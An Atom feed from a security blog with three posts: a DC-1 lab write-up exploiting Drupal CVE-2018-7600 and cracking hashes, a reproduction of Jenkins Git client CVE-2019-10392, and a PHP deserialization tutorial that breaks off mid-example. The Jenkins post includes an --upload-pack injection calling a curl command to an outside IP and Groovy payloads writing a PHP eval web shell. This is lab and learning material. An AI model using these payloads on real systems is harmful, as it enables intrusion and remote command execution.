<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Two_smi1e</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.twosmi1e.com/"/>
  <updated>2019-10-16T06:20:23.491Z</updated>
  <id>https://www.twosmi1e.com/</id>
  
  <author>
    <name>two_smi1e</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DC-1渗透报告</title>
    <link href="https://www.twosmi1e.com/2019/10/16/DC-1%E6%B8%97%E9%80%8F%E6%8A%A5%E5%91%8A/"/>
    <id>https://www.twosmi1e.com/2019/10/16/DC-1渗透报告/</id>
    <published>2019-10-16T06:18:12.000Z</published>
    <updated>2019-10-16T06:20:23.491Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>做了一下DC1到DC6的靶机渗透，简单记录一下过程</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>CVE-2018-7600 Drupal核心远程代码执行漏洞<br>drupal配置文件和重置管理员密码<br>suid提权</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>Nmap扫一下端口发现<br>80端口是drupal 7 服务<br>111 端口是 rpcbind服务</p><h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>用msf开始搜一下drupal漏洞<br><img src="/2019/10/16/DC-1渗透报告/1562240397838.png" alt="Alt text"><br>选一个漏洞设置远程IP地址开始攻击<br><img src="/2019/10/16/DC-1渗透报告/1562240478760.png" alt="Alt text"><br>反弹回一个msf的shell  目录下有flag1<br><img src="/2019/10/16/DC-1渗透报告/1562240673845.png" alt="Alt text"><br>在/sites/default目录下有数据库配置文件 有flag2和数据库用户名密码<br><img src="/2019/10/16/DC-1渗透报告/1562240636851.png" alt="Alt text"><br>登入数据库  有管理员用户名及密码hash<br><img src="/2019/10/16/DC-1渗透报告/1562240709606.png" alt="Alt text"><br>这里有两种方法<br>第一种使用hashcat暴力破解，使用网上的常用密码字典<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">$ ./hashcat64.exe -m 7900 hashes.txt rockyou.txt</span><br><span class="line">hashcat (v5.1.0) starting...</span><br><span class="line"></span><br><span class="line">OpenCL Platform #1: NVIDIA Corporation</span><br><span class="line">======================================</span><br><span class="line">* Device #1: GeForce GTX 1070 Ti, 2048/8192 MB allocatable, 19MCU</span><br><span class="line"></span><br><span class="line">Hashes: 3 digests; 3 unique digests, 3 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Uses-64-Bit</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger set to 90c</span><br><span class="line"></span><br><span class="line">Dictionary cache built:</span><br><span class="line">* Filename..: rockyou.txt</span><br><span class="line">* Passwords.: 14344391</span><br><span class="line">* Bytes.....: 139921497</span><br><span class="line">* Keyspace..: 14344384</span><br><span class="line">* Runtime...: 2 secs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR:53cr3t</span><br><span class="line">Approaching final keyspace - workload adjusted.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Exhausted</span><br><span class="line">Hash.Type........: Drupal7</span><br><span class="line">Hash.Target......: hashes.txt</span><br><span class="line">Time.Started.....: Fri Mar 08 09:19:57 2019 (7 mins, 52 secs)</span><br><span class="line">Time.Estimated...: Fri Mar 08 09:27:49 2019 (0 secs)</span><br><span class="line">Guess.Base.......: File (rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........:    36639 H/s (2.15ms) @ Accel:128 Loops:32 Thr:64 Vec:1</span><br><span class="line">Recovered........: 2/3 (66.67%) Digests, 2/3 (66.67%) Salts</span><br><span class="line">Progress.........: 43033152/43033152 (100.00%)</span><br><span class="line">Rejected.........: 0/43033152 (0.00%)</span><br><span class="line">Restore.Point....: 14344384/14344384 (100.00%)</span><br><span class="line">Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:16352-16384</span><br><span class="line">Candidates.#1....: $HEX[284d6f75746f6e] -&gt; $HEX[042a0337c2a156616d6f732103]</span><br><span class="line">Hardware.Mon.#1..: Temp: 69c Fan: 47% Util: 96% Core:1809MHz Mem:3802MHz Bus:16</span><br></pre></td></tr></table></figure></p><p>密码是53cr3t。</p><p>方法二是通过数据库操作修改密码<br>参考链接：<br><a href="https://www.yuzhi100.com/article/drupal-7-chongzhi-guanliyuan-mima" target="_blank" rel="external">https://www.yuzhi100.com/article/drupal-7-chongzhi-guanliyuan-mima</a></p><p>用drupal自带的 password-hash.sh 加密 drupal<br><img src="/2019/10/16/DC-1渗透报告/1562315416008.png" alt="Alt text"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set pass=&apos;$S$DFLfuzfO9WDKAJcUHnNmhS9NwOD6MRj3pk00qEl4O7iNBD2X4n3v&apos; where name=&apos;admin&apos;;</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/16/DC-1渗透报告/1562315497833.png" alt="Alt text"><br>然后回浏览器登录</p><p>翻一下后台发现flag3<br><img src="/2019/10/16/DC-1渗透报告/1562315539055.png" alt="Alt text"><br><img src="/2019/10/16/DC-1渗透报告/1562315586255.png" alt="Alt text"><br>提示查看shadow文件<br>继续翻目录翻到flag4<br><img src="/2019/10/16/DC-1渗透报告/1562316316583.png" alt="Alt text"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="external">https://github.com/rebootuser/LinEnum</a><br>wget下载这个脚本跑一下<br><img src="/2019/10/16/DC-1渗透报告/1562316619894.png" alt="Alt text"><br>发现提示可能有SUID提权<br>之前flag也提示了用find命令</p><pre><code>find /etc/shadow -exec cat {} \;&gt; all.txt</code></pre><p><img src="/2019/10/16/DC-1渗透报告/1562316739537.png" alt="Alt text"><br>拿到密码hash，然后用john跑一下<br><img src="/2019/10/16/DC-1渗透报告/1562316785690.png" alt="Alt text"></p><p>也可以直接读flag5文件<br><img src="/2019/10/16/DC-1渗透报告/1562316870962.png" alt="Alt text"><br>完成</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://gv7.me/articles/2017/batch-crack-shadows/" target="_blank" rel="external">http://gv7.me/articles/2017/batch-crack-shadows/</a><br><a href="https://www.anquanke.com/post/id/86979" target="_blank" rel="external">https://www.anquanke.com/post/id/86979</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;做了一下DC1到DC6的靶机渗透，简单记录一下过程&lt;/p&gt;
&lt;h2 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;heade
      
    
    </summary>
    
    
      <category term="靶机渗透" scheme="https://www.twosmi1e.com/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
      <category term="wp" scheme="https://www.twosmi1e.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-10392：Jenkins Git client插件RCE复现</title>
    <link href="https://www.twosmi1e.com/2019/10/16/CVE-2019-10392%EF%BC%9AJenkins-Git-client%E6%8F%92%E4%BB%B6RCE%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.twosmi1e.com/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/</id>
    <published>2019-10-16T06:03:38.000Z</published>
    <updated>2019-10-16T06:08:20.881Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><a href="https://jenkins.io/security/advisory/2019-09-12/" target="_blank" rel="external">https://jenkins.io/security/advisory/2019-09-12/</a><br>Git客户端插件接受用户指定的值作为git ls-remote调用的参数，以验证指定URL处是否存在Git存储库。 这种方式允许具有Job / Configure权限的攻击者，以运行Jenkins进程的OS用户的权限在Jenkins主服务器上执行任意系统命令。当以root权限运行Jenkins时，攻击者将会通过攻击得到root权限。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Git client Plugin &lt;= 2.8.4</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用docker搭建<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker search jenkins</span><br><span class="line">docker pull jenkins/jenkins</span><br><span class="line">映射8080端口</span><br><span class="line">docker run -d -p 8080:8080 -p 50000:50000 jenkins/jenkins</span><br></pre></td></tr></table></figure></p><p>访问IP:8080后需要输入密码<br>进入容器获取密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 79931fdd69d5 /bin/bash</span><br><span class="line">jenkins@79931fdd69d5:/$ cat /var/jenkins_home/secrets/initialAdminPassword</span><br></pre></td></tr></table></figure></p><p>开始安装<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570701368800.png" alt="Alt text"><br>安装完成后会让你创建用户，随便创建一个后进入界面。<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570701989181.png" alt="Alt text"><br>选择Manage来新建用户<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570702166984.png" alt="Alt text"><br>创建一个非管理员用户并在Configure Global Security里给予如图权限<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570702599654.png" alt="Alt text"><br>下载漏洞版本插件<br><a href="http://updates.jenkins-ci.org/download/plugins/git-client/2.8.2/git-client.hpi" target="_blank" rel="external">http://updates.jenkins-ci.org/download/plugins/git-client/2.8.2/git-client.hpi</a><br><a href="http://updates.jenkins-ci.org/download/plugins/git/3.12.0/git.hpi" target="_blank" rel="external">http://updates.jenkins-ci.org/download/plugins/git/3.12.0/git.hpi</a><br>将两个插件上传<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570761278914.png" alt="Alt text"><br>安装完成后重启<img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570762944751.png" alt="Alt text"><br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570763755386.png" alt="Alt text"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>登录创建的非管理用户<br>创建一个流水线任务</p><p>在连接git仓库处输入payload<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570764278108.png" alt="Alt text"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--upload-pack=&quot;`ls`&quot;</span><br></pre></td></tr></table></figure></p><p>反弹一个shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--upload-pack=&quot;`curl http://106.54.229.29:9999`&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570764547092.png" alt="Alt text"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>查看文档<a href="https://git-scm.com/docs/git-ls-remote.html" target="_blank" rel="external">https://git-scm.com/docs/git-ls-remote.html</a><br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570772486756.png" alt="Alt text"><br>在远程主机上指定git-upload-pack的完整路径。 这允许列出通过SSH访问的存储库中的引用，并且SSH守护程序不使用用户配置的PATH。由此可以在服务器上执行任意命令。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>实际上是一个比较鸡肋的洞，服务器上必须要低版本插件，并且配合弱口令或者未授权才能进入后台利用。</p><p>其实在后台有个地方能直接执行命令<br>在<a href="http://ip:port/script下面有脚本命令行，属于Jenkins正常功能，利用这个功能可以执行系统命令，配合未授权更方便。" target="_blank" rel="external">http://ip:port/script下面有脚本命令行，属于Jenkins正常功能，利用这个功能可以执行系统命令，配合未授权更方便。</a><br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570773935872.png" alt="Alt text"><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">println(&quot;id&quot;.execute().getText())</span><br><span class="line"></span><br><span class="line">new File(&quot;/var/www/html/media.php&quot;).write(&apos;&lt;?php @eval($_POST[test]);?&gt;&apos;);</span><br><span class="line"></span><br><span class="line">def webshell = &apos;&lt;?php @eval($_POST[test]);?&gt;&apos;</span><br><span class="line">new File(&quot;/var/www/html/media.php&quot;).write(&quot;$webshell&quot;);</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-09-12/&quot; tar
      
    
    </summary>
    
    
      <category term="漏洞复现" scheme="https://www.twosmi1e.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化</title>
    <link href="https://www.twosmi1e.com/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://www.twosmi1e.com/2018/12/20/PHP反序列化/</id>
    <published>2018-12-20T12:00:54.000Z</published>
    <updated>2018-12-25T11:06:59.166Z</updated>
    
    <content type="html"><![CDATA[<p>从浅至深来记录一下PHP反序列化的知识。本文首发于<a href="https://xz.aliyun.com/t/3674" target="_blank" rel="external">先知社区</a>,转载请注明来源</p><h2 id="0x00-PHP序列化是什么"><a href="#0x00-PHP序列化是什么" class="headerlink" title="0x00 PHP序列化是什么"></a>0x00 PHP序列化是什么</h2><h3 id="两个函数"><a href="#两个函数" class="headerlink" title="两个函数"></a>两个函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">serialize()    <span class="comment">//将一个对象转换成一个字符串</span></span><br><span class="line">unserialize()<span class="comment">//将字符串还原成一个对象</span></span><br></pre></td></tr></table></figure><p>通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $flag = <span class="string">"flag&#123;233&#125;"</span>;</span><br><span class="line"><span class="keyword">public</span> $a = <span class="string">"aaa"</span>;</span><br><span class="line"><span class="keyword">static</span> $b = <span class="string">"bbb"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test = <span class="keyword">new</span> test;</span><br><span class="line">$data = serialize($test);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反序列化可以控制类属性，无论是private还是public<br><img src="/2018/12/20/PHP反序列化/1542683244179.png" alt="Alt text"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:10:&quot;testflag&quot;;s:9:&quot;flag&#123;233&#125;&quot;;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;</span><br><span class="line">O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125;</span><br></pre></td></tr></table></figure></p><p>这里说明一下序列化字符串的含义：<br><code>O:4:&quot;test&quot;</code>指Object(对象) 4个字符:test<br><code>:2</code>对象属性个数为2<br>{}中为属性字符数：属性值</p><p><strong>注意：</strong>可以看到testflag的长度为8，序列化中却显示长度为10。这是因为它是private属性，翻阅文档就会在两侧加入空字节。<br><img src="/2018/12/20/PHP反序列化/1542683756635.png" alt="Alt text"><br>所以在传入序列化字符串进行反序列化时需要注意补齐两个空字节。</p><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$str = <span class="string">'O%3A4%3A%22test%22%3A2%3A%7Bs%3A10%3A%22%00test%00flag%22%3Bs%3A9%3A%22flag%7B233%7D%22%3Bs%3A1%3A%22a%22%3Bs%3A3%3A%22aaa%22%3B%7D'</span>;</span><br><span class="line">$data = urldecode($str);</span><br><span class="line">$obj = unserialize($data);</span><br><span class="line"></span><br><span class="line">var_dump($obj);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2018/12/20/PHP反序列化/1542687588777.png" alt="Alt text"></p><h2 id="0x01-魔术方法"><a href="#0x01-魔术方法" class="headerlink" title="0x01 魔术方法"></a>0x01 魔术方法</h2><p>在利用对PHP反序列化进行利用时，经常需要通过反序列化中的魔术方法，检查方法里有无敏感操作来进行利用。</p><h3 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__construct()<span class="comment">//创建对象时触发</span></span><br><span class="line">__destruct() <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__invoke() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><h3 id="比较重要的方法"><a href="#比较重要的方法" class="headerlink" title="比较重要的方法"></a>比较重要的方法</h3><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><blockquote><p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p></blockquote><p>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p><h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><blockquote><p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</p></blockquote><p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p><p>实例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Caiji</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ID, $sex, $age)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;ID = $ID;</span><br><span class="line"><span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line"><span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line"><span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;info . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * serialize前调用 用于删选需要被序列化存储的成员变量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">return</span> [<span class="string">'ID'</span>, <span class="string">'sex'</span>, <span class="string">'age'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * unserialize前调用 用于预先准备对象资源</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$me = <span class="keyword">new</span> Caiji(<span class="string">'twosmi1e'</span>, <span class="number">20</span>, <span class="string">'male'</span>);</span><br><span class="line"></span><br><span class="line">$me-&gt;getInfo();</span><br><span class="line"><span class="comment">//存在__sleep(函数，$info属性不会被存储</span></span><br><span class="line">$temp = serialize($me);</span><br><span class="line"><span class="keyword">echo</span> $temp . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"></span><br><span class="line">$me = unserialize($temp);</span><br><span class="line"><span class="comment">//__wakeup()组装的$info</span></span><br><span class="line">$me-&gt;getInfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>运行结果：<br><img src="/2018/12/20/PHP反序列化/1544258803318.png" alt="Alt text"></p><h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><blockquote><p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Caiji</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ID, $sex, $age)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;ID = $ID;</span><br><span class="line"><span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line"><span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line"><span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$me = <span class="keyword">new</span> Caiji(<span class="string">'twosmi1e'</span>, <span class="number">20</span>, <span class="string">'male'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'__toString:'</span> . $me . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果：<br><img src="/2018/12/20/PHP反序列化/1544260686584.png" alt="Alt text"></p><h3 id="热身题"><a href="#热身题" class="headerlink" title="热身题"></a>热身题</h3><p>这是D0g3平台一道很简单的反序列化的题，GET读str内容进行反序列化等于$KEY就get flag了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$KEY = <span class="string">"D0g3!!!"</span>;</span><br><span class="line">$str = $_GET[<span class="string">'str'</span>];</span><br><span class="line"><span class="keyword">if</span> (unserialize($str) === <span class="string">"$KEY"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$flag"</span>;</span><br><span 